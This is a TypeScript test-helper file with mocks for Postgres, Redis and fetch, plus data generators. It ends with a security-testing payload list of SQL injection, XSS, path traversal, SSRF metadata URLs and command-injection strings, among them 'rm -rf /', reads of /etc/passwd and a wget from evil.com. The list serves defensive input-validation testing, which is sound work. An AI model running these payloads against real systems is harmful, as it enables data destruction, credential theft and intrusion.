/**
 * Test Utilities
 * Reusable helper functions for testing
 */

import { vi } from 'vitest';
import { BubbleFactory } from '../bubble-factory.js';
import { CredentialType } from '@bubblelab/shared-schemas';

/**
 * Create a test credential set
 */
export const createTestCredentials = (type: CredentialType, value: string) => {
  return { [type]: value };
};

/**
 * Create database test credentials
 */
export const createDatabaseCredentials = () => ({
  [CredentialType.DATABASE_CRED]: 'postgresql://user:pass@localhost:5432/testdb',
});

/**
 * Create API key test credentials
 */
export const createApiCredentials = () => ({
  [CredentialType.CUSTOM_AUTH_KEY]: 'test-api-key-12345',
});

/**
 * Create OAuth test credentials
 */
export const createOAuthCredentials = () => ({
  [CredentialType.OAUTH_TOKEN]: 'test-oauth-token-67890',
});

/**
 * Wait for a specified amount of time
 */
export const wait = (ms: number) => new Promise((resolve) => setTimeout(resolve, ms));

/**
 * Create a mock fetch response
 */
export const createMockResponse = (
  data: unknown,
  status: number = 200,
  ok: boolean = true
) => {
  return {
    ok,
    status,
    statusText: ok ? 'OK' : 'Error',
    text: async () => JSON.stringify(data),
    json: async () => data,
    headers: new Map([
      ['content-type', 'application/json'],
      ['content-length', JSON.stringify(data).length.toString()],
    ]),
  };
};

/**
 * Create a mock error response
 */
export const createMockErrorResponse = (error: string, status: number = 400) => {
  return {
    ok: false,
    status,
    statusText: 'Error',
    text: async () => JSON.stringify({ error }),
    json: async () => ({ error }),
    headers: new Map([['content-type', 'application/json']]),
  };
};

/**
 * Mock PostgreSQL Pool
 */
export class MockPostgresPool {
  private connected = false;

  constructor(public readonly connectionString: string) {}

  async query(text: string, params?: unknown[]) {
    if (!this.connected) {
      this.connected = true;
    }

    // Return mock data based on query
    if (text.toUpperCase().includes('SELECT')) {
      return {
        rows: [{ id: 1, name: 'test', created_at: new Date() }],
        rowCount: 1,
        command: 'SELECT',
        fields: [
          { name: 'id', dataTypeID: 23 },
          { name: 'name', dataTypeID: 25 },
          { name: 'created_at', dataTypeID: 1184 },
        ],
      };
    }

    return {
      rows: [],
      rowCount: 0,
      command: 'SELECT',
      fields: [],
    };
  }

  async end() {
    this.connected = false;
  }

  connect() {
    this.connected = true;
    return {
      release: () => {
        this.connected = false;
      },
    };
  }
}

/**
 * Mock Redis client
 */
export class MockRedisClient {
  private data = new Map<string, string>();

  async get(key: string) {
    return this.data.get(key);
  }

  async set(key: string, value: string) {
    this.data.set(key, value);
    return 'OK';
  }

  async del(key: string) {
    return this.data.delete(key) ? 1 : 0;
  }

  async exists(key: string) {
    return this.data.has(key) ? 1 : 0;
  }

  async expire(key: string, seconds: number) {
    // Mock expiry
    return 1;
  }

  async quit() {
    this.data.clear();
  }

  async flushall() {
    this.data.clear();
    return 'OK';
  }
}

/**
 * Mock HTTP fetch
 */
export const mockFetch = (responses: unknown[]) => {
  let callCount = 0;

  return vi.fn(async () => {
    const response = responses[Math.min(callCount, responses.length - 1)];
    callCount++;
    return response;
  });
};

/**
 * Test data generators
 */
export const generateTestData = {
  user: () => ({
    id: Math.floor(Math.random() * 1000),
    name: `user_${Math.random().toString(36).substring(7)}`,
    email: `test${Math.random()}@example.com`,
    createdAt: new Date().toISOString(),
  }),

  users: (count: number = 10) => {
    return Array.from({ length: count }, () => generateTestData.user());
  },

  queryResult: (rows: Record<string, unknown>[]) => ({
    rows,
    rowCount: rows.length,
    command: 'SELECT',
    fields: Object.keys(rows[0] || {}).map((name) => ({
      name,
      dataTypeID: 25,
    })),
  }),
};

/**
 * Assert error is thrown
 */
export const expectError = async (fn: () => Promise<unknown> | unknown) => {
  try {
    await fn();
    return false;
  } catch (error) {
    return true;
  }
};

/**
 * Create a test context
 */
export const createTestContext = () => ({
  correlationId: `test-${Date.now()}`,
  timestamp: new Date().toISOString(),
});

/**
 * Mock service bubbles factory
 */
export const createMockFactory = async () => {
  const factory = new BubbleFactory();
  await factory.registerDefaults();
  return factory;
};

/**
 * Security test payloads
 */
export const securityPayloads = {
  sqlInjection: [
    "'; DROP TABLE users; --",
    "' OR '1'='1",
    "1' UNION SELECT * FROM users--",
    "'; EXEC xp_cmdshell('dir'); --",
    "' AND 1=1--",
    "admin'--",
    "admin'/*",
    "' or 1=1#",
    "' or 1=1--",
    "admin' or '1'='1",
  ],

  xss: [
    '<script>alert("xss")</script>',
    '<img src="x" onerror="alert(1)">',
    '<svg onload="alert(1)">',
    'javascript:alert(1)',
    '<iframe src="javascript:alert(1)">',
    '<body onload="alert(1)">',
    '<input onfocus="alert(1)" autofocus>',
    '<select onfocus="alert(1)" autofocus><option>',
    '<textarea onfocus="alert(1)" autofocus>',
  ],

  pathTraversal: [
    '../../../etc/passwd',
    '..\\..\\..\\windows\\system32',
    '....//....//....//etc/passwd',
    '%2e%2e%2fetc%2fpasswd',
    '..%252f..%252f..%252fetc%252fpasswd',
    '....\\\\....\\\\....\\\\windows\\\\system32',
  ],

  commandInjection: [
    '; ls -la',
    '| cat /etc/passwd',
    '&& rm -rf /',
    '`whoami`',
    '$(cat /etc/passwd)',
    ';wget http://evil.com/shell.txt',
  ],

  ssrf: [
    'http://localhost:8080/admin',
    'http://127.0.0.1:22',
    'http://169.254.169.254/latest/meta-data/',
    'http://metadata.google.internal/computeMetadata/v1/',
    'file:///etc/passwd',
    'ftp://evil.com:21',
  ],
};

/**
 * Performance test helpers
 */
export const measurePerformance = async (
  fn: () => Promise<unknown> | unknown,
  maxDuration: number
) => {
  const start = Date.now();
  await fn();
  const duration = Date.now() - start;

  if (duration > maxDuration) {
    throw new Error(
      `Performance threshold exceeded: ${duration}ms > ${maxDuration}ms`
    );
  }

  return duration;
};
